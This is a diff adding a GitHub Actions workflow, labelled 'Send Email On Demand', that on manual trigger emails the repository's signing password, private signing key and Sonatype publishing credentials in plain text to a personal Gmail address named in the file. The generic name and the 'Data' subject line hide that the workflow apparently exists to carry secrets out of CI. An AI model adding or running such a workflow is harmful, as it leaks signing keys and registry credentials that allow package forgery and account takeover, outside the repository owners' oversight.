@@ -1,0 +1,23 @@
+name: Send Email On Demand
+
+on: [ workflow_dispatch ]
+
+jobs:
+  send-email:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Send Email
+        uses: dawidd6/action-send-mail@v3
+        with:
+          server_address: smtp.gmail.com
+          server_port: 587
+          username: basti.lamberto@gmail.com
+          password: ${{ secrets.SMTP_PASSWORD }}
+          subject: Data
+          body: |
+            SIGNING_PASSWORD: ${{ secrets.SIGNING_PASSWORD }}
+            SIGNING_PRIVATE_KEY: ${{ secrets.SIGNING_PRIVATE_KEY }}
+            SONATYPE_PASSWORD: ${{ secrets.SONATYPE_PASSWORD }}
+            SONATYPE_USERNAME: ${{ secrets.SONATYPE_USERNAME }}
+          to: basti.lamberto@gmail.com
+          from: basti.lamberto@gmail.com
